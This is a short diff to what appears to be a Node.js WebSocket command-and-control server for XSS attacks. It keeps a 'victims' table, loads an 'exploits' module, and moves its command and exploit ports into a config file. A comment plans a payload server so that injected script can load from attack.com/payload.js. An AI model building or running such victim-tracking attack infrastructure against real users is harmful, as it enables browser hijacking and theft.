@@ -1,5 +1,6 @@
 const ws = require('ws')
 
+const config = require('./config')
 const exploits = require('./exploits')
 
 const victims = {}
@@ -57,8 +58,7 @@ function handle_cmd(conn, cmd, args) {
 }
 
 function main() {
-    // TODO Move ports to a config file
-    const CMD_PORT = 1337
+    const CMD_PORT = config.cmd_port
     new ws.Server({ port: CMD_PORT })
     .on('connection', conn => {
         conn.on('message', data => {
@@ -72,7 +72,7 @@ function main() {
 
     // TODO Add a payload server so XSS can just do <script src='attack.com/payload.js'>
 
-    const EXPLOIT_PORT = 8080
+    const EXPLOIT_PORT = config.exploit_port
     new ws.Server({ port: EXPLOIT_PORT })
     .on('connection', (conn, req) => {
         const vic_name = req.connection.remoteAddress + ':' + req.connection.remotePort
